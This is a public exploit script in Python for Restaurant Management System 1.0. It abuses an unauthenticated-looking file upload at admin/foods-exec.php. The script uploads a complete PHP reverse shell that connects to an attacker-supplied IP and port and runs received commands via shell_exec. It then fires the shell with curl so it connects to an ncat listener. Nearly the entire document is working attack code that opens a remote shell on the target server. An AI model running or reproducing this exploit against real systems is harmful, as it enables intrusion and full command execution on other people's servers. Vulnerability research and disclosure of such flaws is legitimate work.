# Exploit Title: Restaurant Management System 1.0  - Remote Code Execution
# Date: 2019-10-16
# Exploit Author: Ibad Shah
# Vendor Homepage: https://www.sourcecodester.com/users/lewa
# Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
# Version: N/A
# Tested on: Apache 2.4.41

#!/usr/bin/python

import requests
import sys

print("\n\t\t>>>- cOdEd By: Venexy | Telegram: @MaxiiKimii -<<<\n")
if len(sys.argv) != 4:
    print("[+] Usage : python exploit.py http://target.com/ <ip> <port>")
    exit()

url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

if len(sys.argv[1]) < 8:
    print("[+] Usage : python exploit.py http://target.com/")
    exit()

print("[+] Restaurant Management System Exploit, Uploading Shell")

target = url + "admin/foods-exec.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
    "Referer": "http://localhost:8081/rms/admin/foods.php",
    "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
    "Upgrade-Insecure-Requests": "1"
}

# Full PHP reverse shell code
php_reverse_shell = f"""
<?php
set_time_limit(0);
$ip = '{ip}';  // Change this to your IP
$port = {port};  // Change this to your port

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    die($errno . ": " . $errstr);
}}

while (1) {{
    $cmd = trim(fgets($sock));
    if ($cmd == "quit") {{
        break;
    }}
    $output = shell_exec($cmd);
    fwrite($sock, $output);
    fwrite($sock, "\n");
}}
fclose($sock);
?>
"""
#print(php_reverse_shell)
data = f"""
-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="exploit.php"
Content-Type: text/html

{php_reverse_shell}
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""

r = requests.post(target, verify=False, headers=headers, data=data)

print("[+] Shell Uploaded. Please check the URL: " + url + "images/exploit.php")

            
import subprocess

# Start the reverse listener using ncat
#reverse_listener_command = f"ncat -lvp {port}"
#listener_process = subprocess.Popen(reverse_listener_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Wait for a moment to ensure the listener is ready
print(f"[+] Make sure Listener is running on {port}!")
import time
time.sleep(2)

#print("[+] Reverse listener started. Waiting for the shell connection...")
print("[+] Shell executed on the target!")
# Now, execute the PHP reverse shell on the target
execute_shell_command = f"curl -s {url}images/exploit.php"
execute_shell_process = subprocess.Popen(execute_shell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
execute_shell_process.communicate()



# Wait for the listener process to finish
#listener_process.wait()

# Close the listener
#listener_process.terminate()
